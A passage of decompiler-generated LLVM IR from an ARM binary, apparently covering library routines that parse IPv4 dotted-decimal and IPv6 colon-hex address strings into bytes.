  %v1_137d4 = phi i32 [ %v0_137c8.pr, %dec_label_pc_137c8thread-pre-split ], [ %v1_137a8, %dec_label_pc_137a8 ]
  %v2_137c8 = icmp eq i32 %v1_137d4, 0
  store i1 %v2_137c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137c8, label %dec_label_pc_137d0, label %dec_label_pc_137b0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137c8
  %v0_137d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_137d0 = icmp eq i32 %v0_137d0, 0
  store i1 %v2_137d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137d0, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_137d0
  %v4_137d4 = add i32 %v3_137d4, 1
  %v5_137d4 = inttoptr i32 %v4_137d4 to i8*
  store i8 0, i8* %v5_137d4, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_13784, %dec_label_pc_1376c, %dec_label_pc_13754, %dec_label_pc_13740, %dec_label_pc_137b0, %dec_label_pc_137d0, %bb
  %v0_137d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_137d8, i32* %r0.global-to-local, align 4
  %v2_137dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137dc, i32* @r4, align 4
  ret i32 %v0_137d8

; uselistorder directives
  uselistorder i32 %v1_137d4, { 1, 0 }
  uselistorder i32 %v1_137a8, { 1, 0 }
  uselistorder i32 %v0_137a0, { 1, 0 }
  uselistorder i32 %v1_13798, { 0, 2, 1 }
  uselistorder i32 %v1_13794, { 1, 0 }
  uselistorder i32 %v0_13730, { 2, 1, 0, 3 }
  uselistorder i32 %v5_13724, { 1, 0 }
  uselistorder i32 %v0_13724, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @function_137e0(i8* %arg1) local_unnamed_addr {
dec_label_pc_137e0:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_138182 = load i32, i32* @r0, align 4
  %v1_138183 = inttoptr i32 %v0_138182 to i8*
  %v2_138184 = load i8, i8* %v1_138183, align 1
  %v3_138185 = zext i8 %v2_138184 to i32
  store i32 %v3_138185, i32* @r2, align 4
  %v2_1381c6 = icmp eq i8 %v2_138184, 0
  br i1 %v2_1381c6, label %dec_label_pc_13828, label %dec_label_pc_137f4.preheader

dec_label_pc_137ec:                               ; preds = %dec_label_pc_137f4
  %v1_137fc = add i32 %v0_137fc, 1
  %v9_137ec = icmp eq i32 %v0_13808, %v3_137f4
  br i1 %v9_137ec, label %dec_label_pc_13808, label %dec_label_pc_137f4

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137f4.preheader, %dec_label_pc_137ec
  %v0_137fc = phi i32 [ %tmp, %dec_label_pc_137f4.preheader ], [ %v1_137fc, %dec_label_pc_137ec ]
  %v1_137f4 = inttoptr i32 %v0_137fc to i8*
  %v2_137f4 = load i8, i8* %v1_137f4, align 1
  %v3_137f4 = zext i8 %v2_137f4 to i32
  store i32 %v3_137f4, i32* @ip, align 4
  %v2_137f8 = icmp eq i8 %v2_137f4, 0
  br i1 %v2_137f8, label %dec_label_pc_13828, label %dec_label_pc_137ec

dec_label_pc_13808:                               ; preds = %dec_label_pc_137ec
  %v2_13808 = icmp eq i32 %v0_13808, 0
  br i1 %v2_13808, label %dec_label_pc_13828, label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %dec_label_pc_13808
  %v1_13810 = add i32 %v0_13810, 1
  store i32 %v1_13810, i32* @lr, align 4
  %v1_13814 = add i32 %v0_13814, 1
  %v1_13818 = inttoptr i32 %v1_13814 to i8*
  %v2_13818 = load i8, i8* %v1_13818, align 1
  %v3_13818 = zext i8 %v2_13818 to i32
  store i32 %v3_13818, i32* @r2, align 4
  %v2_1381c = icmp eq i8 %v2_13818, 0
  br i1 %v2_1381c, label %dec_label_pc_13828, label %dec_label_pc_137f4.preheader

dec_label_pc_137f4.preheader:                     ; preds = %dec_label_pc_137e0, %dec_label_pc_13810
  %v0_13814 = phi i32 [ %v1_13814, %dec_label_pc_13810 ], [ %v0_138182, %dec_label_pc_137e0 ]
  %v0_13810 = phi i32 [ %v1_13810, %dec_label_pc_13810 ], [ 0, %dec_label_pc_137e0 ]
  %v0_13808 = phi i32 [ %v3_13818, %dec_label_pc_13810 ], [ %v3_138185, %dec_label_pc_137e0 ]
  br label %dec_label_pc_137f4

dec_label_pc_13828:                               ; preds = %dec_label_pc_13808, %dec_label_pc_13810, %dec_label_pc_137f4, %dec_label_pc_137e0
  %v0_13828 = phi i32 [ 0, %dec_label_pc_137e0 ], [ %v0_13810, %dec_label_pc_137f4 ], [ %v1_13810, %dec_label_pc_13810 ], [ %v0_13810, %dec_label_pc_13808 ]
  ret i32 %v0_13828

; uselistorder directives
  uselistorder i32 %v3_137f4, { 1, 0 }
  uselistorder i32 %v0_137fc, { 1, 0 }
  uselistorder i32* @ip, { 8, 9, 4, 26, 27, 28, 29, 10, 31, 30, 1, 32, 33, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 34, 35, 36, 37, 38, 39, 40, 41, 103, 110, 18, 19, 0, 20, 21, 22, 23, 42, 43, 6, 44, 5, 45, 104, 25, 108, 105, 106, 107, 2, 109, 46, 47, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 7, 57, 15, 11, 12, 16, 17, 58, 24, 13, 14, 60, 59 }
  uselistorder label %dec_label_pc_13828, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_137f4.preheader, { 1, 0 }
}

define i32 @function_13830(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13830:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_13830 = load i32, i32* @r5, align 4
  %v2_13838 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_13838, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_138c03 = load i8, i8* %arg1, align 1
  %v3_138c04 = zext i8 %v2_138c03 to i32
  %v5_138c05 = add i32 %tmp, 1
  store i32 %v5_138c05, i32* @r4, align 4
  %v2_138c46 = icmp eq i8 %v2_138c03, 0
  store i1 %v2_138c46, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138c46, label %dec_label_pc_138d0, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_13830, %dec_label_pc_138c0.backedge
  %v0_1389c = phi i32 [ %v3_138c0, %dec_label_pc_138c0.backedge ], [ %v3_138c04, %dec_label_pc_13830 ]
  %v1_138c810.in = phi i32 [ %v3_138c0, %dec_label_pc_138c0.backedge ], [ %v3_138c04, %dec_label_pc_13830 ]
  %v1_138c810 = add nsw i32 %v1_138c810.in, -48
  %v2_13858 = icmp ugt i32 %v1_138c810, 8
  %v7_13858 = icmp eq i32 %v1_138c810, 9
  store i1 %v7_13858, i1* %cpsr_z.global-to-local, align 1
  %v2_13860 = xor i1 %v7_13858, true
  %v3_13860 = and i1 %v2_13858, %v2_13860
  br i1 %v3_13860, label %dec_label_pc_1389c, label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_13858
  %v0_13864 = load i32, i32* %r0.global-to-local, align 4
  %v1_13864 = inttoptr i32 %v0_13864 to i8*
  %v2_13864 = load i8, i8* %v1_13864, align 1
  %v3_13864 = zext i8 %v2_13864 to i32
  %v3_1386c = mul nuw nsw i32 %v3_13864, 10
  %v4_1386c = add nuw nsw i32 %v3_1386c, %v0_1389c
  %v1_13870 = add nsw i32 %v4_1386c, -48
  %v2_13874 = icmp ugt i32 %v1_13870, 254
  %v7_13874 = icmp eq i32 %v1_13870, 255
  store i1 %v7_13874, i1* %cpsr_z.global-to-local, align 1
  %v2_13878 = xor i1 %v7_13874, true
  %v3_13878 = and i1 %v2_13874, %v2_13878
  br i1 %v3_13878, label %dec_label_pc_138f4, label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13864
  %v0_1387c = load i32, i32* %r1.global-to-local, align 4
  %v2_1387c = icmp eq i32 %v0_1387c, 0
  store i1 %v2_1387c, i1* %cpsr_z.global-to-local, align 1
  %v1_13880 = trunc i32 %v1_13870 to i8
  store i8 %v1_13880, i8* %v1_13864, align 1
  %v0_13884 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13884, label %dec_label_pc_13888, label %dec_label_pc_138c0.backedge

dec_label_pc_13888:                               ; preds = %dec_label_pc_1387c
  %v0_13888 = load i32, i32* @lr, align 4
  %v1_13888 = add i32 %v0_13888, 1
  store i32 %v1_13888, i32* @lr, align 4
  %v7_1388c = icmp eq i32 %v1_13888, 4
  store i1 %v7_1388c, i1* %cpsr_z.global-to-local, align 1
  %v0_13890 = load i32, i32* %r1.global-to-local, align 4
  %v1_13890 = add i32 %v0_13890, 1
  store i32 %v1_13890, i32* %r1.global-to-local, align 4
  %v8_13894 = icmp sgt i32 %v1_13888, 4
  br i1 %v8_13894, label %dec_label_pc_138f4, label %dec_label_pc_138c0.backedge

dec_label_pc_1389c:                               ; preds = %dec_label_pc_13858
  %v7_1389c = icmp eq i32 %v0_1389c, 46
  store i1 %v7_1389c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1389c, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1389c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_138f4

bb:                                               ; preds = %dec_label_pc_1389c
  %v1_138a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_138a4 = urem i32 %v1_138a4, 2
  %v2_138a8 = icmp eq i32 %v2_138a4, 0
  store i1 %v2_138a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_138a8, label %dec_label_pc_138f4, label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %bb
  %v0_138b4 = load i32, i32* @lr, align 4
  %v7_138b4 = icmp eq i32 %v0_138b4, 4
  store i1 %v7_138b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_138b4, label %dec_label_pc_138f4, label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138b4
  %v2_138bc = load i32, i32* %r0.global-to-local, align 4
  %v3_138bc = add i32 %v2_138bc, 1
  %v4_138bc = inttoptr i32 %v3_138bc to i8*
  store i8 0, i8* %v4_138bc, align 1
  %v5_138bc = load i32, i32* %r0.global-to-local, align 4
  %v6_138bc = add i32 %v5_138bc, 1
  store i32 %v6_138bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_138c0.backedge

dec_label_pc_138c0.backedge:                      ; preds = %dec_label_pc_138bc, %dec_label_pc_1387c, %dec_label_pc_13888
  %v0_138c0 = load i32, i32* @r4, align 4
  %v1_138c0 = inttoptr i32 %v0_138c0 to i8*
  %v2_138c0 = load i8, i8* %v1_138c0, align 1
  %v3_138c0 = zext i8 %v2_138c0 to i32
  %v5_138c0 = add i32 %v0_138c0, 1
  store i32 %v5_138c0, i32* @r4, align 4
  %v2_138c4 = icmp eq i8 %v2_138c0, 0
  store i1 %v2_138c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138c4, label %dec_label_pc_138c0.dec_label_pc_138d0_crit_edge, label %dec_label_pc_13858

dec_label_pc_138c0.dec_label_pc_138d0_crit_edge:  ; preds = %dec_label_pc_138c0.backedge
  %v0_138d0.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_138d0

dec_label_pc_138d0:                               ; preds = %dec_label_pc_138c0.dec_label_pc_138d0_crit_edge, %dec_label_pc_13830
  %v0_138d0 = phi i32 [ %v0_138d0.pre, %dec_label_pc_138c0.dec_label_pc_138d0_crit_edge ], [ 0, %dec_label_pc_13830 ]
  %v7_138d0 = icmp eq i32 %v0_138d0, 3
  store i1 %v7_138d0, i1* %cpsr_z.global-to-local, align 1
  %v7_138d4 = icmp slt i32 %v0_138d0, 4
  br i1 %v7_138d4, label %dec_label_pc_138f4, label %dec_label_pc_138d8

dec_label_pc_138d8:                               ; preds = %dec_label_pc_138d0
  %v0_138d8 = load i32, i32* @r5, align 4
  store i32 %v0_138d8, i32* @r0, align 4
  store i32 %v2_13838, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_138e4 = call i32 @function_ec10()
  br label %dec_label_pc_138f4

dec_label_pc_138f4:                               ; preds = %dec_label_pc_13864, %dec_label_pc_13888, %bb, %dec_label_pc_138b4, %.thread12, %dec_label_pc_138d0, %dec_label_pc_138d8
  %storemerge = phi i32 [ 1, %dec_label_pc_138d8 ], [ 0, %dec_label_pc_138d0 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_138b4 ], [ 0, %bb ], [ 0, %dec_label_pc_13888 ], [ 0, %dec_label_pc_13864 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_13830, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_138d0, { 1, 0 }
  uselistorder i32 %v3_138c0, { 1, 0 }
  uselistorder i32 %v0_1389c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 10, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_138f4, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_138c0.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13858, { 1, 0 }
}

define i32 @function_138fc(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_138fc:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_138fc = load i32, i32* @r4, align 4
  %v6_138fc = load i32, i32* @r5, align 4
  %v9_138fc = load i32, i32* @r6, align 4
  %v7_13900 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_13900, label %dec_label_pc_13920, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_138fc
  %v7_13914 = icmp eq i32 %arg1, 10
  br i1 %v7_13914, label %dec_label_pc_13934, label %dec_label_pc_13ae4

dec_label_pc_13920:                               ; preds = %dec_label_pc_138fc
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_13928 = call i32 @function_13830(i8* %arg2, i32 %arg3)
  store i32 %v4_13928, i32* %r0.global-to-local, align 4
  store i32 %v4_13928, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13934:                               ; preds = %dec_label_pc_13914
  %v2_13934 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_13934, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_13940 = bitcast i32* %stack_var_-52 to i8*
  %v3_13940 = call i32 @function_ec20(i8* %v2_13940, i32 0)
  store i32 %v3_13940, i32* %r0.global-to-local, align 4
  %v0_13944 = load i32, i32* @r6, align 4
  %v1_13944 = inttoptr i32 %v0_13944 to i8*
  %v2_13944 = load i8, i8* %v1_13944, align 1
  %v3_13944 = zext i8 %v2_13944 to i32
  store i32 %v3_13944, i32* %r3.global-to-local, align 4
  %v7_13948 = icmp eq i8 %v2_13944, 58
  store i32 %v3_13940, i32* @r4, align 4
  %v2_13950 = add i32 %v3_13940, 16
  store i32 %v2_13950, i32* %r8.global-to-local, align 4
  br i1 %v7_13948, label %dec_label_pc_13958, label %dec_label_pc_13964

dec_label_pc_13958:                               ; preds = %dec_label_pc_13934
  %v1_13958 = add i32 %v0_13944, 1
  %v2_13958 = inttoptr i32 %v1_13958 to i8*
  %v3_13958 = load i8, i8* %v2_13958, align 1
  %v4_13958 = zext i8 %v3_13958 to i32
  store i32 %v4_13958, i32* %r3.global-to-local, align 4
  store i32 %v1_13958, i32* @r6, align 4
  %v7_1395c = icmp eq i8 %v3_13958, 58
  br i1 %v7_1395c, label %dec_label_pc_13964, label %dec_label_pc_13af8

dec_label_pc_13964:                               ; preds = %dec_label_pc_13958, %dec_label_pc_13934
  %v0_13968 = phi i32 [ %v1_13958, %dec_label_pc_13958 ], [ %v0_13944, %dec_label_pc_13934 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_13968, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_13a447 = inttoptr i32 %v0_13968 to i8*
  %v2_13a448 = load i8, i8* %v1_13a447, align 1
  %v3_13a449 = zext i8 %v2_13a448 to i32
  store i32 %v3_13a449, i32* %r0.global-to-local, align 4
  %v1_13a4810 = call i32 @function_145a8(i32 %v3_13a449)
  store i32 %v1_13a4810, i32* %r0.global-to-local, align 4
  store i32 %v1_13a4810, i32* @r5, align 4
  %v2_13a4c12 = icmp eq i32 %v1_13a4810, 0
  br i1 %v2_13a4c12, label %dec_label_pc_13a54, label %dec_label_pc_13978

dec_label_pc_13978:                               ; preds = %dec_label_pc_13964, %dec_label_pc_13a44.backedge
  %v0_1397c = phi i32 [ %v1_13a48, %dec_label_pc_13a44.backedge ], [ %v1_13a4810, %dec_label_pc_13964 ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_13a44.backedge ], [ 0, %dec_label_pc_13964 ]
  store i32 ptrtoint ([17 x i8]* @global_var_1703c.599 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1703c.599 to i32), i32* %r0.global-to-local, align 4
  %v3_13984 = call i32 @function_145dc(i32 ptrtoint ([17 x i8]* @global_var_1703c.599 to i32), i32 %v0_1397c)
  %v4_13984 = trunc i32 %v3_13984 to i8
  store i32 %v3_13984, i32* %r0.global-to-local, align 4
  %v3_13988 = icmp eq i8 %v4_13984, 0
  %v0_1398c = load i32, i32* @r6, align 4
  %v1_1398c = add i32 %v0_1398c, 1
  store i32 %v1_1398c, i32* @r6, align 4
  br i1 %v3_13988, label %dec_label_pc_139a8, label %dec_label_pc_13994

dec_label_pc_13994:                               ; preds = %dec_label_pc_13978
  %v0_13994 = load i32, i32* %sb.global-to-local, align 4
  %v2_13994 = sext i8 %v4_13984 to i32
  %v3_13994 = sub i32 %v2_13994, %v0_13994
  store i32 %v3_13994, i32* %r3.global-to-local, align 4
  %v1_13998 = load i32, i32* %r7.global-to-local, align 4
  %v4_13998 = mul i32 %v1_13998, 16
  %v5_13998 = or i32 %v4_13998, %v3_13994
  store i32 %v5_13998, i32* %r7.global-to-local, align 4
  %v3_139a0 = icmp ult i32 %v5_13998, 65534
  br i1 %v3_139a0, label %dec_label_pc_13a3c, label %dec_label_pc_13af8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_13978
  %v0_139a8 = load i32, i32* @r5, align 4
  %v7_139a8 = icmp eq i32 %v0_139a8, 58
  br i1 %v7_139a8, label %dec_label_pc_139b0, label %dec_label_pc_13a0c

dec_label_pc_139b0:                               ; preds = %dec_label_pc_139a8
  %v4_139b02 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_139b02, i32* %r3.global-to-local, align 4
  %v2_139b4 = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_139b4, label %dec_label_pc_139bc, label %dec_label_pc_139d0

dec_label_pc_139bc:                               ; preds = %dec_label_pc_139b0
  %v0_139bc = load i32, i32* %fp.global-to-local, align 4
  %v2_139bc = icmp eq i32 %v0_139bc, 0
  br i1 %v2_139bc, label %dec_label_pc_139c4, label %dec_label_pc_13af8

dec_label_pc_139c4:                               ; preds = %dec_label_pc_139bc
  %v0_139c4 = load i32, i32* @r4, align 4
  store i32 %v0_139c4, i32* %fp.global-to-local, align 4
  store i32 %v1_1398c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13a44.backedge

dec_label_pc_139d0:                               ; preds = %dec_label_pc_139b0
  %v1_139d0 = inttoptr i32 %v1_1398c to i8*
  %v2_139d0 = load i8, i8* %v1_139d0, align 1
  %v3_139d0 = zext i8 %v2_139d0 to i32
  store i32 %v3_139d0, i32* %r3.global-to-local, align 4
  %v2_139d4 = icmp eq i8 %v2_139d0, 0
  br i1 %v2_139d4, label %dec_label_pc_13af8, label %dec_label_pc_139dc

dec_label_pc_139dc:                               ; preds = %dec_label_pc_139d0
  %v0_139dc = load i32, i32* @r4, align 4
  %v1_139dc = add i32 %v0_139dc, 2
  store i32 %v1_139dc, i32* %r3.global-to-local, align 4
  %v1_139e0 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_139dc, %v1_139e0
  br i1 %tmp38, label %dec_label_pc_13af8, label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139dc
  %v0_139e8 = load i32, i32* %r7.global-to-local, align 4
  %v3_139e8 = udiv i32 %v0_139e8, 256
  store i32 %v3_139e8, i32* %r2.global-to-local, align 4
  store i32 %v0_139dc, i32* %r3.global-to-local, align 4
  %v1_139f0 = trunc i32 %v3_139e8 to i8
  %v3_139f0 = inttoptr i32 %v0_139dc to i8*
  store i8 %v1_139f0, i8* %v3_139f0, align 1
  %v4_139f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_139f0 = add i32 %v4_139f0, 1
  store i32 %v5_139f0, i32* %r3.global-to-local, align 4
  %v0_139f4 = load i32, i32* @r6, align 4
  store i32 %v0_139f4, i32* %sl.global-to-local, align 4
  %v0_139f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_139f8 = trunc i32 %v0_139f8 to i8
  %v2_139f8 = load i32, i32* @r4, align 4
  %v3_139f8 = add i32 %v2_139f8, 1
  %v4_139f8 = inttoptr i32 %v3_139f8 to i8*
  store i8 %v1_139f8, i8* %v4_139f8, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13a00 = load i32, i32* %r3.global-to-local, align 4
  %v1_13a00 = add i32 %v0_13a00, 1
  store i32 %v1_13a00, i32* @r4, align 4
  %v0_13a44.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13a44.backedge

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139a8
  %v7_13a0c = icmp eq i32 %v0_139a8, 46
  br i1 %v7_13a0c, label %dec_label_pc_13a14, label %dec_label_pc_13af8

dec_label_pc_13a14:                               ; preds = %dec_label_pc_13a0c
  %v0_13a14 = load i32, i32* @r4, align 4
  %v1_13a14 = add i32 %v0_13a14, 4
  store i32 %v1_13a14, i32* @r5, align 4
  %v1_13a18 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_13a14, %v1_13a18
  br i1 %tmp39, label %dec_label_pc_13af8, label %dec_label_pc_13a20

dec_label_pc_13a20:                               ; preds = %dec_label_pc_13a14
  %v0_13a24 = load i32, i32* %sl.global-to-local, align 4
  %v1_13a24 = inttoptr i32 %v0_13a24 to i8*
  store i32 %v0_13a24, i32* %r0.global-to-local, align 4
  %v4_13a28 = call i32 @function_13830(i8* %v1_13a24, i32 %v0_13a14)
  store i32 %v4_13a28, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_13a28, 1
  br i1 %tmp36, label %dec_label_pc_13af8, label %bb

bb:                                               ; preds = %dec_label_pc_13a20
  %v5_13a30 = load i32, i32* @r5, align 4
  store i32 %v5_13a30, i32* @r4, align 4
  br label %dec_label_pc_13a80

dec_label_pc_13a3c:                               ; preds = %dec_label_pc_13994
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13a44.backedge

dec_label_pc_13a44.backedge:                      ; preds = %dec_label_pc_13a3c, %dec_label_pc_139c4, %dec_label_pc_139e8
  %v0_13a44 = phi i32 [ %v1_1398c, %dec_label_pc_139c4 ], [ %v0_13a44.pre, %dec_label_pc_139e8 ], [ %v1_1398c, %dec_label_pc_13a3c ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_139c4 ], [ 0, %dec_label_pc_139e8 ], [ 1, %dec_label_pc_13a3c ]
  %v1_13a44 = inttoptr i32 %v0_13a44 to i8*
  %v2_13a44 = load i8, i8* %v1_13a44, align 1
  %v3_13a44 = zext i8 %v2_13a44 to i32
  store i32 %v3_13a44, i32* %r0.global-to-local, align 4
  %v1_13a48 = call i32 @function_145a8(i32 %v3_13a44)
  store i32 %v1_13a48, i32* %r0.global-to-local, align 4
  store i32 %v1_13a48, i32* @r5, align 4
  %v2_13a4c = icmp eq i32 %v1_13a48, 0
  br i1 %v2_13a4c, label %dec_label_pc_13a54, label %dec_label_pc_13978

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a44.backedge, %dec_label_pc_13964
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_13964 ], [ %stack_var_-56.0.be, %dec_label_pc_13a44.backedge ]
  %v4_13a543 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_13a543, i32* %r3.global-to-local, align 4
  %v2_13a58 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_13ac4.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_13a58, label %dec_label_pc_13a80, label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a54
  %v1_13a60 = add i32 %v0_13ac4.pre.pre, 2
  store i32 %v1_13a60, i32* %r3.global-to-local, align 4
  %v1_13a64 = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_13a60, %v1_13a64
  br i1 %tmp40, label %dec_label_pc_13af8, label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %dec_label_pc_13a60
  store i32 %v0_13ac4.pre.pre, i32* %r3.global-to-local, align 4
  %v0_13a70 = load i32, i32* %r7.global-to-local, align 4
  %v3_13a70 = udiv i32 %v0_13a70, 256
  store i32 %v3_13a70, i32* %r2.global-to-local, align 4
  %v1_13a74 = trunc i32 %v3_13a70 to i8
  %v3_13a74 = inttoptr i32 %v0_13ac4.pre.pre to i8*
  store i8 %v1_13a74, i8* %v3_13a74, align 1
  %v4_13a74 = load i32, i32* %r3.global-to-local, align 4
  %v5_13a74 = add i32 %v4_13a74, 1
  store i32 %v5_13a74, i32* %r3.global-to-local, align 4
  %v0_13a78 = load i32, i32* %r7.global-to-local, align 4
  %v1_13a78 = trunc i32 %v0_13a78 to i8
  %v2_13a78 = load i32, i32* @r4, align 4
  %v3_13a78 = add i32 %v2_13a78, 1
  %v4_13a78 = inttoptr i32 %v3_13a78 to i8*
  store i8 %v1_13a78, i8* %v4_13a78, align 1
  %v0_13a7c = load i32, i32* %r3.global-to-local, align 4
  %v1_13a7c = add i32 %v0_13a7c, 1
  store i32 %v1_13a7c, i32* @r4, align 4
  br label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a54, %bb, %dec_label_pc_13a6c
  %v0_13ac4.pre = phi i32 [ %v5_13a30, %bb ], [ %v1_13a7c, %dec_label_pc_13a6c ], [ %v0_13ac4.pre.pre, %dec_label_pc_13a54 ]
  %v0_13a80 = load i32, i32* %fp.global-to-local, align 4
  %v2_13a80 = icmp eq i32 %v0_13a80, 0
  %v1_13ac4.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_13a80, label %dec_label_pc_13ac4, label %dec_label_pc_13a88

dec_label_pc_13a88:                               ; preds = %dec_label_pc_13a80
  %v9_13a88 = icmp eq i32 %v0_13ac4.pre, %v1_13ac4.pre
  %v2_13a8c = sub i32 %v0_13ac4.pre, %v0_13a80
  store i32 %v2_13a8c, i32* %r0.global-to-local, align 4
  br i1 %v9_13a88, label %dec_label_pc_13af8, label %dec_label_pc_13aac.preheader

dec_label_pc_13aac.preheader:                     ; preds = %dec_label_pc_13a88
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13aac
  %v0_13a9c = load i32, i32* %fp.global-to-local, align 4
